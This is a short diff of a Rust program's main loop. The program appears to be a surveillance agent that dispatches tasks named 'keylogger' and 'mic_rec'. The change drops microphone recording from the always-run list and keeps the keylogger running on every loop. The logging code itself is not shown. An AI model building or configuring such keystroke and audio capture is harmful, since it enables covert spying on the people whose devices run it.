@@ -54,7 +54,7 @@ async fn main() {
         ("6", "mic_rec"),
     ];
     let mut already_executed: HashSet<String> = HashSet::new();
-    let always_run: [&'static str; 2] = ["keylogger", "mic_rec"];
+    let always_run: [&'static str; 1] = ["keylogger"];
     let mut running_tasks: HashSet<String> = HashSet::new();
 
     loop {
